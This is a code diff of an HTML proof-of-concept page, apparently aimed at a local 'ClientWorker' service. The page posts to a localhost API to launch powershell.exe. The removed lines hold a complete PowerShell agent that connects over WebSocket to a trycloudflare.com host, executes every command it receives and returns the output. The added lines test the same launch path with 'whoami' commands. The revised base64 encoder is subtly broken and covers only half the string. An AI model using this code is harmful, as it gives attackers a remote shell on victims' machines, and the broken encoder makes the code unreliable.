@@ -4,94 +4,29 @@
 <script>
 function toBase64Utf16LE(str) {
     const bytes = new Uint8Array(str.length * 2);
-    for (let i = 0; i < str.length; i++) {
-        const c = str.charCodeAt(i);
-        bytes[i * 2]     = c & 0xff;
-        bytes[i * 2 + 1] = (c >> 8) & 0xff;
+    for (let i = 0; i < str.length * 1; i++) {
+        const c = str.charCodeAt(Math.floor(i / 2));
+        bytes[i] = (i % 2 === 0) ? (c & 0xff) : ((c >> 8) & 0xff);
     }
     let binary = "";
-    for (const b of bytes) {
-        binary += String.fromCharCode(b);
-    }
+    for (const b of bytes) binary += String.fromCharCode(b);
     return btoa(binary);
 }
 
-// Yazılacak ps1 script'inin tam icerigi
-const psScript = `$uri = [Uri]"wss://pleased-seems-serious-knee.trycloudflare.com/ws/agent"
-$ws = [System.Net.WebSockets.ClientWebSocket]::new()
-
-try {
-    $ws.ConnectAsync(
-        $uri,
-        [Threading.CancellationToken]::None
-    ).GetAwaiter().GetResult()
-
-    Write-Host "Connected"
-
-    $buffer = New-Object byte[] 4096
-
-    while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
-        $segment = [ArraySegment[byte]]::new($buffer)
-
-        $received = $ws.ReceiveAsync(
-            $segment,
-            [Threading.CancellationToken]::None
-        ).GetAwaiter().GetResult()
-
-        if ($received.MessageType -eq
-            [System.Net.WebSockets.WebSocketMessageType]::Close) {
-            break
-        }
-
-        $json = [Text.Encoding]::UTF8.GetString(
-            $buffer, 0, $received.Count
-        )
-        $message = $json | ConvertFrom-Json
-        $result = Invoke-Expression $message.task | Out-String
-        if ($message.task -eq "hostname" -or 1 -eq 1) {
-            $reply = @{
-                task   = "hostname"
-                result = $result.Trim()
-            } | ConvertTo-Json -Compress
-            #Write-Host $result
-            $bytes = [Text.Encoding]::UTF8.GetBytes($reply)
-            $segmentOut = [ArraySegment[byte]]::new($bytes)
-
-            $ws.SendAsync(
-                $segmentOut,
-                [System.Net.WebSockets.WebSocketMessageType]::Text,
-                $true,
-                [Threading.CancellationToken]::None
-            ).GetAwaiter().GetResult()
-        }
-    }
+function runCommand(args) {
+    const url = 'http://127.0.0.1:8082/api/Client/StartProcessWithArguments/' +
+        'powershell.exe/' + encodeURIComponent(args);
+    return fetch(url, { method: 'POST' })
+        .then(r => console.log('HTTP:', r.status, '| args:', args.slice(0, 60)))
+        .catch(e => console.error('FETCH ERROR:', e));
 }
-finally {
-    $ws.Dispose()
-}`;
 
-// 1) psScript icerigini base64 (UTF16LE) olarak kodla
-const psScriptB64 = toBase64Utf16LE(psScript);
+// TEST 1: coklu arguman calisiyor mu?
+runCommand('-Command whoami > C:\\ClientWorker\\t1.txt');
 
-// 2) Dis komut: base64'u cozip dosyaya yaz (komutta $ veya " yok, escape derdi yok)
-const innerCommand =
-    "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('" +
-    psScriptB64 +
-    "')) | Set-Content -Path 'C:\\ClientWorker\\agent.ps1' -Encoding UTF8";
-
-const encoded = toBase64Utf16LE(innerCommand);
-
-const url =
-    'http://127.0.0.1:8082/api/Client/StartProcessWithArguments/' +
-    'powershell.exe/' +
-    encodeURIComponent('-EncodedCommand ' + encoded);
-
-fetch(url, {
-    method: 'POST'
-})
-.then(r => console.log('HTTP:', r.status))
-.catch(e => console.error('FETCH ERROR:', e));
+// TEST 2: EncodedCommand calisiyor mu?
+runCommand('-EncodedCommand ' + toBase64Utf16LE('whoami > C:\\ClientWorker\\t2.txt'));
 </script>
-<h2>ClientWorker PoC</h2>
+<h2>ClientWorker Debug</h2>
 </body>
 </html>
